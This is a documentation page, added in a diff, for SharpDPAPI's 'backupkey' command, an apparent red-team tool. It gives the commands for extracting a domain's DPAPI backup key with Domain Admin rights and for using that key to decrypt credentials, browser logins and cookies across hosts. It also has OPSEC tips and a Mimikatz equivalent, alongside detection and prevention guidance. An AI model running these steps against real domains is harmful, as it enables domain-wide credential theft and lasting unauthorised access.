@@ -1,0 +1,309 @@
+---
+title: 'backupkey'
+description: 'Retrieve domain DPAPI backup key from domain controller'
+icon: 'download'
+---
+
+## Overview
+
+The **backupkey** command retrieves the domain DPAPI backup key from a domain controller using the **LsaRetrievePrivateData** API. This private key can decrypt masterkeys for any domain user and never changes.
+
+<Warning>
+  This command requires Domain Admin (or equivalent) privileges to retrieve the backup key from the domain controller.
+</Warning>
+
+## Basic Usage
+
+```bash
+# Retrieve from current domain controller
+SharpDPAPI.exe backupkey
+
+# Specify domain controller
+SharpDPAPI.exe backupkey /server:dc.domain.com
+
+# Save to file
+SharpDPAPI.exe backupkey /file:key.pvk
+
+# Prevent base64 wrapping
+SharpDPAPI.exe backupkey /nowrap
+```
+
+## Command Arguments
+
+| Argument | Description |
+|----------|-------------|
+| `/server:SERVER.domain.com` | Specify domain controller (auto-detected if not provided) |
+| `/file:key.pvk` | Save backup key to file instead of displaying |
+| `/nowrap` | Prevent wrapping base64 output (display in single line) |
+
+## Why The Backup Key Is Powerful
+
+<CardGroup cols={2}>
+  <Card title="Never Changes" icon="infinity">
+    The domain backup key is generated once and never rotates
+  </Card>
+  <Card title="Domain-Wide" icon="globe">
+    Works for ALL domain users across the entire domain
+  </Card>
+  <Card title="Decrypt Anything" icon="unlock">
+    Can decrypt any user's DPAPI protected data
+  </Card>
+  <Card title="Persistent Access" icon="clock">
+    Maintains access even after password changes
+  </Card>
+</CardGroup>
+
+## Example: Retrieve Backup Key
+
+```bash
+SharpDPAPI.exe backupkey
+```
+
+**Output:**
+```
+[*] Action: Retrieve domain DPAPI backup key
+
+[*] Using current domain controller  : PRIMARY.testlab.local
+[*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
+[*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
+[*] Key :
+      HvG1sAAAAAABAAAAAAAAAAAAAACUBAAABwIAAACkAABSU0EyAAgAAA
+      EAAQADYjk2xX6BGbvXhUKJwq0M9BqvzaKLLLfSU... (truncated)
+```
+
+## Example: Save to File
+
+```bash
+SharpDPAPI.exe backupkey /server:primary.testlab.local /file:key.pvk
+```
+
+**Output:**
+```
+[*] Action: Retrieve domain DPAPI backup key
+
+[*] Using server                     : primary.testlab.local
+[*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
+[*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
+[*] Backup key written to            : key.pvk
+```
+
+<Tip>
+  Save the backup key to a file for reuse. You won't need to retrieve it again.
+</Tip>
+
+## Using The Retrieved Backup Key
+
+Once you have the backup key, use it with other SharpDPAPI commands:
+
+<Tabs>
+  <Tab title="Base64 Key">
+    ```bash
+    # Use inline base64 key
+    SharpDPAPI.exe triage /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+    SharpDPAPI.exe masterkeys /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+    SharpDPAPI.exe credentials /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...
+    ```
+  </Tab>
+
+  <Tab title="Key File">
+    ```bash
+    # Use key file
+    SharpDPAPI.exe triage /pvk:key.pvk
+    SharpDPAPI.exe masterkeys /pvk:key.pvk
+    SharpDPAPI.exe credentials /pvk:key.pvk
+    ```
+  </Tab>
+
+  <Tab title="Remote Systems">
+    ```bash
+    # Triage remote systems with backup key
+    SharpDPAPI.exe triage /pvk:key.pvk /server:workstation1.domain.com
+    SharpDPAPI.exe credentials /pvk:key.pvk /server:workstation2.domain.com
+    ```
+  </Tab>
+
+  <Tab title="SharpChrome">
+    ```bash
+    # Use with SharpChrome
+    SharpChrome.exe logins /pvk:key.pvk
+    SharpChrome.exe cookies /pvk:key.pvk
+    SharpChrome.exe statekeys /pvk:key.pvk
+    ```
+  </Tab>
+</Tabs>
+
+## Typical Workflow
+
+<Steps>
+  <Step title="Obtain Domain Admin">
+    Compromise an account with Domain Admin or equivalent privileges
+  </Step>
+
+  <Step title="Retrieve Backup Key">
+    ```bash
+    SharpDPAPI.exe backupkey /file:backup.pvk
+    ```
+  </Step>
+
+  <Step title="Triage Local System">
+    ```bash
+    SharpDPAPI.exe triage /pvk:backup.pvk
+    SharpChrome.exe logins /pvk:backup.pvk
+    ```
+  </Step>
+
+  <Step title="Triage Remote Systems">
+    ```bash
+    # File servers, workstations, etc.
+    SharpDPAPI.exe triage /pvk:backup.pvk /server:fileserver.domain.com
+    SharpDPAPI.exe triage /pvk:backup.pvk /server:workstation.domain.com
+    ```
+  </Step>
+
+  <Step title="Maintain Access">
+    Keep the backup key secure - it provides persistent domain-wide DPAPI decryption capability
+  </Step>
+</Steps>
+
+## Technical Details
+
+### Storage Location
+
+The backup key is stored in Active Directory as an LSA secret:
+```
+G$BCKUPKEY_{GUID}
+```
+
+### Retrieval Method
+
+SharpDPAPI uses the **LsaRetrievePrivateData** API, the same method used by Mimikatz:
+- Connects to domain controller
+- Authenticates with current credentials
+- Retrieves the preferred backup key GUID
+- Extracts the RSA private key
+
+### Key Properties
+
+- **Algorithm**: RSA (typically 2048-bit)
+- **Format**: Microsoft PRIVATEKEYBLOB structure
+- **Persistence**: Never rotates unless manually regenerated
+- **Scope**: All domain users
+
+## Converting Key Formats
+
+The backup key can be used in different formats:
+
+<Tabs>
+  <Tab title="For SharpDPAPI">
+    ```bash
+    # Use directly as base64 or .pvk file
+    SharpDPAPI.exe triage /pvk:key.pvk
+    ```
+  </Tab>
+
+  <Tab title="For Mimikatz">
+    ```bash
+    # Decode base64 to binary .pvk file
+    [IO.File]::WriteAllBytes("key.pvk", [Convert]::FromBase64String($base64key))
+
+    # Use with Mimikatz
+    mimikatz# dpapi::masterkey /in:masterkey_file /pvk:key.pvk
+    ```
+  </Tab>
+</Tabs>
+
+## Detection Considerations
+
+<Warning>
+  Retrieving the domain backup key is a high-value operation that should be detected and alerted.
+</Warning>
+
+### Network Detection
+
+- **MS-BKRP Protocol**: Backup Key Remote Protocol usage
+- **RPC Calls**: LsaRetrievePrivateData calls to domain controller
+- **Event ID 4662**: Access to sensitive AD objects
+
+### Host-Based Detection
+
+- **Process Execution**: SharpDPAPI.exe or similar tools
+- **API Calls**: LsaRetrievePrivateData invocations
+- **Privilege Usage**: SeBackupPrivilege or equivalent
+
+### Event Log Indicators
+
+Monitor domain controllers for:
+```
+Event ID: 4662
+Object Type: Secret Object
+Access Mask: Read Property
+Object Name: G$BCKUPKEY_*
+```
+
+### Defensive Measures
+
+<Accordion title="Detection Strategies">
+  - Monitor for Event ID 4662 with object name containing "BCKUPKEY"
+  - Alert on MS-BKRP protocol usage
+  - Track LsaRetrievePrivateData API calls
+  - Monitor for privileged account access to sensitive LSA secrets
+</Accordion>
+
+<Accordion title="Prevention Strategies">
+  - Strictly control Domain Admin privileges
+  - Implement tiered administration model
+  - Use Protected Users group for high-value accounts
+  - Enable advanced audit policies for object access
+  - Consider rotating backup key periodically (requires planning)
+</Accordion>
+
+## Related Commands
+
+<CardGroup cols={2}>
+  <Card title="masterkeys" icon="key" href="/ghostpack-docs/SharpDPAPI-mdx/commands/masterkeys">
+    Decrypt user masterkeys with backup key
+  </Card>
+  <Card title="triage" icon="list-check" href="/ghostpack-docs/SharpDPAPI-mdx/commands/triage">
+    Comprehensive user DPAPI triage
+  </Card>
+  <Card title="credentials" icon="id-card" href="/ghostpack-docs/SharpDPAPI-mdx/commands/credentials">
+    Decrypt credentials with backup key
+  </Card>
+  <Card title="machinetriage" icon="server" href="/ghostpack-docs/SharpDPAPI-mdx/commands/machinetriage">
+    Triage machine DPAPI data
+  </Card>
+</CardGroup>
+
+## Tips
+
+<Accordion title="Operational Security">
+  - Retrieve the backup key once and reuse it
+  - Store securely - it's valid indefinitely
+  - Use `/file` to avoid base64 in command history
+  - Consider exfiltrating key over encrypted channel
+  - Clean up temporary files after use
+</Accordion>
+
+<Accordion title="Troubleshooting">
+  **Access Denied:**
+  - Verify you have Domain Admin privileges
+  - Check network connectivity to domain controller
+  - Ensure domain controller is reachable
+
+  **No backup key found:**
+  - Domain must have DPAPI enabled (default in AD)
+  - Verify the domain controller is functioning properly
+  - Try specifying DC explicitly with `/server`
+</Accordion>
+
+## Mimikatz Equivalent
+
+```bash
+# Mimikatz command
+mimikatz# lsadump::backupkeys /system:dc.domain.com /export
+
+# SharpDPAPI equivalent
+SharpDPAPI.exe backupkey /server:dc.domain.com /file:key.pvk
+```
+
+Both retrieve the same backup key, just in different formats.
